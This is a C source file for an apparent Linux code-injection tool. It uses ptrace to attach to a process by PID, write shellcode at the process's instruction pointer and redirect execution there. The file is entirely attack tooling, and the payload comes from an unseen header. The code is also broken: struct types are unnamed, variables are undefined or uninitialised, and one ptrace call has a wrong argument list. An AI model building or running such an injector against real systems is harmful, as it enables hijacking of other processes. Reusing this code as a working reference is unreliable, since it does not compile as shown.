#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include "so_injector.h"

int attach_target_process(pid_t processId){
    printf("[+] Tracing process without sending SIGSTOP %d\n", processId);
    int syscallReturnCode = ptrace(PTRACE_SEIZE, processId, NULL, NULL); 
    if (syscallReturnCode < 0){
        perror("[-] Ptrace Seize syscall has failed\n");
        exit(syscallReturnCode);
    }
    return 0;
}

int detach_target_process(pid_t processId){
    int syscallReturnCode = ptrace(PTRACE_DETACH, processId, NULL, NULL);
    if (syscallReturnCode < 0)
	{
	  perror("[-] Ptrace detach syscall has failed\n");
	  exit(syscallReturnCode);
	}
    return 0;
}

struct get_target_process_registers(pid_t processId){
    struct user_regs_struct targetProcessRegisters;
    printf("[+] Getting target process registers\n");
    int syscallReturnCode = ptrace(PTRACE_GETREGS, processId, &targetProcessRegisters); 
    if (syscallReturnCode < 0){
        perror("[-] Ptrace Get regs syscall has failed\n");
        exit(syscallReturnCode);
    }
    return targetProcessRegisters;
}

int inject_shellcode(pid_t targetProcess, struct targetProcessRegisters){
    printf("[+] Injecting shellcode to the target process RIP register: %p\n", (void*) targetProcessRegisters.rip);
    int i;
    uint32_t *sourceAddress;
    uint32_t *destinationAddress;
    for (i = 0; i < SHELL_CODE_SIZE; i+=4, *sourceAddress++, *destinationAddress++)
        {
            int syscallReturnCode = ptrace(PTRACE_POKETEXT, targetProcessId, destinationAddress, *sourceAddress);
            if (syscallReturnCode < 0){
                perror ("[-] PTRACE POKETEXT syscall failed\n");
                exit (syscallReturnCode);
            }
        }
    printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);
    int syscallReturnCode = ptrace(PTRACE_SETREGS, targetProcess, NULL, &regs);
    if(syscallReturnCode < 0)
        {
        perror ("[-] Ptrace Set Registers syscall failed\n");
        exit (syscallReturnCode);
        }
     return 0;
}

int inject_so(pid_t processId){
    attach_target_process(processId);
    inject_shellcode(processId, get_target_process_registers(processId));
    detach_target_process(processId);
    return 0;
}


int main(int argc, char* argv[], char *envp[]){
    if (argc != 2){
        fprintf(stderr, "Usage: ./so_injector --target-process <pid>\n ", argv[0]);
        exit(-1);
    }
    pid_t targetProcess = atoi(argv[1]);
    inject_so(targetProcess);
    return 1;
}
